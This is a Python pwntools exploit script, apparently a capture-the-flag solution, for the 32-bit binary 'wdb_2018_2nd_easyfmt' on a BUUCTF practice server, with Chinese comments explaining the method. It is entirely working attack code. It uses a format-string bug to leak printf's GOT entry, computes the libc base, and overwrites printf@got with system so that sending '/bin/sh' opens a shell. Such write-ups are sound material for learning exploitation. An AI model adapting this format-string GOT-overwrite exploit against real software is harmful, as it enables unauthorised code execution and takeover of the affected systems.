from pwn import *

r = remote(r'node5.buuoj.cn', 26984)
elf = ELF('wdb_2018_2nd_easyfmt')
libc = ELF(r'../libc/libc-2.23_32.so')
context.log_level = 'debug'

# 解题思路为：利用fmt泄漏printf的got表地址，再修改printf@got为system@plt即可（与`[第五空间2019 决赛]PWN5`类似）
printf_got = elf.got['printf']
r.recvuntil(b'repeater?')
r.send(b'aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')  # 偏移为6
print(r.recvline())
leak_payload = p32(printf_got) + b'BBB' + b'%6$s'
r.send(leak_payload)
print(r.recvuntil(b'BBB'))
printf_addr = u32(r.recv(4))
# printf_addr = u32(r.recvuntil("\xf7")[-4:])
print(hex(printf_addr))

base_addr = printf_addr - libc.sym['printf']
system_addr = base_addr + libc.sym['system']

system_payload = fmtstr_payload(6, {printf_got: system_addr}, write_size='byte', numbwritten=0)
r.send(system_payload)
r.send(b'/bin/sh\x00')
r.interactive()
